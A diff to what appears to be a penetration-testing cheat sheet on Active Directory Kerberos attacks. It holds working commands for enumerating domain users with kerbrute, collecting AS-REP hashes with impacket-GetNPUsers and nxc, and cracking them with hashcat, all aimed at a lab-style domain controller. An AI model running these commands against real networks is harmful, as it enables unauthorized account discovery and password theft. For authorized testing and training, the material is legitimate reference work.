@@ -16,11 +16,12 @@ Abuses Kerberos AS-REQ pre-auth responses: `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` = u
 # User enumeration
 ./kerbrute userenum -d corp.local --dc 192.168.56.101 usernames.txt -o valid_users.txt
 
-# AS-REP roasting sweep — kerbrute has no dedicated 'asreproast' subcommand; userenum's
-# --hash-file flag captures hashcat-crackable AS-REP (mode 18200) for any account with preauth disabled
-./kerbrute userenum -d corp.local --dc 192.168.56.101 users.txt --hash-file asrep_hashes.txt
+# AS-REP roasting — kerbrute userenum logs AS-REP hashes to its -o output file when it
+# encounters accounts with preauth disabled, but the output mixes status lines with hashes.
+# For clean hashcat-ready AS-REP hashes (mode 18200), use GetNPUsers.py or nxc instead:
+#   impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 192.168.56.101 -format hashcat -outputfile asrep_hashes.txt
+#   nxc ldap 192.168.56.101 -u users.txt -p '' --asreproast asrep_hashes.txt
 hashcat -m 18200 asrep_hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule
-# Alternatives: Impacket's GetNPUsers.py, or nxc's --asreproast flag (see NetExec section below)
 
 # Password spraying via Kerberos pre-auth — faster/quieter than SMB/LDAP binds,
 # but STILL counts against lockout policy; --safe aborts on lockout signal
